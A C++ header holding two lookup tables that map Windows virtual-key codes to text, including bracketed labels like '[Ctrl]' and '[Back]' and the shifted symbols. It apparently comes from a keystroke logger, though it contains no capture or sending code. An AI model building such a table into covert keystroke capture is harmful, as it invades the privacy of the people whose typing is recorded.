#ifndef LOOKUP_TABLES_H
#define LOOKUP_TABLES_H
#include <unordered_map>

using namespace std;

unordered_map<int, char*> VK_LUT_lcase = {
	{ VK_TAB		, "[TAB]"	},
	{ VK_BACK		, "[Back]"	},
	{ VK_SPACE		, " "		},
	{ VK_RETURN		, "\n"		},
	{ VK_CANCEL		, "[Cancel]"},
	{ VK_LCONTROL	, "[Ctrl]"	},
	{ VK_RCONTROL	, "[Ctrl]"	},
	{ VK_LMENU		, "[Alt]"	},
	{ VK_RMENU		, "[Alt]"	},
	{ VK_INSERT		, "[INSERT]"},
	{ VK_DELETE		, "[Del]"	},
	{ VK_NUMPAD0	, "0"		},
	{ VK_NUMPAD1	, "1"		},
	{ VK_NUMPAD2	, "2"		},
	{ VK_NUMPAD3	, "3"		},
	{ VK_NUMPAD4	, "4"		},
	{ VK_NUMPAD5	, "5"		},
	{ VK_NUMPAD6	, "6"		},
	{ VK_NUMPAD7	, "7"		},
	{ VK_NUMPAD8	, "8"		},
	{ VK_NUMPAD9	, "9"		},
	{ VK_OEM_2		, "/"		},
	{ VK_OEM_3		, "`"		},
	{ VK_OEM_4		, "["		},
	{ VK_OEM_5		, "\\"		},
	{ VK_OEM_6		, "]"		},
	{ VK_OEM_7		, "'"		},
	{ 0xBA			, ";"		},
	{ 0xBB			, "="		},
	{ 0xBC			, ","		},
	{ 0xBD			, "-"		},
	{ 0xBE			, "."		}
};
unordered_map<int, char*> VK_LUT_ucase = {
	{ VK_OEM_2	, "?" },
	{ VK_OEM_3	, "~" },
	{ VK_OEM_4	, "{" },
	{ VK_OEM_5	, "|" },
	{ VK_OEM_6	, "}" },
	{ VK_OEM_7	, "\""},
	{ 0xBA		, ":" },
	{ 0xBB		, "+" },
	{ 0xBC		, "<" },
	{ 0xBD		, "_" },
	{ 0xBE		, ">" },
	{ 0x30		, ")" },
	{ 0x31		, "!" },
	{ 0x32		, "@" },
	{ 0x33		, "#" },
	{ 0x34		, "$" },
	{ 0x35		, "%" },
	{ 0x36		, "^" },
	{ 0x37		, "&" },
	{ 0x38		, "*" },
	{ 0x39		, "(" },
};

#endif